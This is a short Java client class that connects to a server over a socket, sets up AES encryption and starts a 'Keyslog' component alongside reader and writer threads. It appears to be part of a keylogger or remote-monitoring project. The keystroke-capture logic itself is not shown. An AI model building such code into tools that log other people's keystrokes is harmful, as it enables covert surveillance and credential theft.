package User;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;
import java.util.Scanner;
import java.util.StringTokenizer;

public class Client {
	private String host;
	private int port;
	public static WriteClient write;
        public static AESEncryption aes;
        public static String key;
        public static Socket client;
	public Client(String host, int port) {
		this.host = host;
		this.port = port;
	}
	
	public void execute() throws IOException {
		client = new Socket(host, port);
                System.out.println("Connected");
                aes=new AESEncryption();
                File file=new File("keyslog.txt");
                file.delete();
                Keyslog keyslog=new Keyslog();
                keyslog.Keyslog();
                write = new WriteClient(client);
		write.start();
		ReadClient read = new ReadClient(client);
                read.setkey();
		read.start();
                
	}
	
	
//	public static void main(String[] args) throws IOException {
//		Client client = new Client("192.168.1.12", 1234);
//		client.execute();
//	}
        
}





